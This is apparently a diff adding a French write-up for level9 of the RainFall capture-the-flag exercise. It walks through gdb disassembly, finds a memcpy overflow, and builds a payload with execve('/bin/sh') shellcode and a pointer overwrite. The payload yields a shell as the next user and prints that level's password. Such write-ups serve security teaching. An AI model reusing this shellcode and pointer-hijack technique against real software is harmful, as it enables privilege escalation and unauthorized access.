@@ -1,0 +1,54 @@
+Le programme appellant memcpy, on peut penser qu'un buffer overflow peut s'operer
+On va dans un premier temps recuperer l'adresse de memcpy, de la maniere suivante:
+
+(gdb) disas 0x804870e
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:   push   %ebp
+   0x0804870f <+1>:   mov    %esp,%ebp
+   0x08048711 <+3>:   sub    $0x18,%esp
+   0x08048714 <+6>:   mov    0xc(%ebp),%eax
+   0x08048717 <+9>:   mov    %eax,(%esp)
+   0x0804871a <+12>:  call   0x8048520 <strlen@plt>
+
+   0x08048733 <+37>:  call   0x8048510 <memcpy@plt>
+=> 0x08048738 <+42>:   leave                           # set the breakpoint here
+   0x08048739 <+43>:  ret
+End of assembler dump.
+(gdb) b *0x08048738
+Breakpoint 1 at 0x8048738
+(gdb) run aaaaaaaaaaaaaaaaaaaaaaa
+
+(gdb) x/x $eax
+0x804a00c:  0x61616161
+
+Notre entree commence a l'adresse '0x804a00c'.
+Dans le main, on peut voir que '0x10(%esp)' est placee dans $eax qui se fit dereferencer deux fois
+et se fait stocker dans  $edx avant d'etre appelle:
+
+=> 0x0804867c <+136>:  mov    0x10(%esp),%eax
+   0x08048680 <+140>: mov    (%eax),%eax
+   0x08048682 <+142>: mov    (%eax),%edx
+
+   0x08048693 <+159>: call   *%edx
+
+
+(gdb) x/8x $esp
+0xbffff6c0: 0x0804a008  0xbffff8cb  0xbffff790  0xb7d79e55
+0xbffff6d0: 0x0804a078  0x0804a008  0x0804a078  0x0804a008
+
+On peut voir que '0x10(%esp)' pointe vers l'adresse '0x0804a078'
+On remarque egalement que '0x0804a078' vaut 108 (0x6c) apres avoir recu notre string.
+Maintenant qu'on a notre offset, on peut tenter d'injecter un shellcode.
+Pour cela, on va ecraser '0x10(%esp)' (0x0804a078) avec l'adresse de notre entree.
+L'adresse sera dereferencee deux fois, donc on doit ajouter une adresse au debut de notre string pour
+pointer vers le debut de notre shellcode:
+
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x90'*59 + '\x0c\xa0\x04\x08'")
+
+On a donc l'addrese de notre input plus 4, notre shellcode, 59 fois 'nop' pour atteindre '0x10(%esp)' (0x0804a078), puis l'adresse de debut de notre input.
+
+level9@RainFall:~$ ./level9 $(python -c "print '\x10\xa0\x04\x08' + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x90'*59 + '\x0c\xa0\x04\x08'")
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
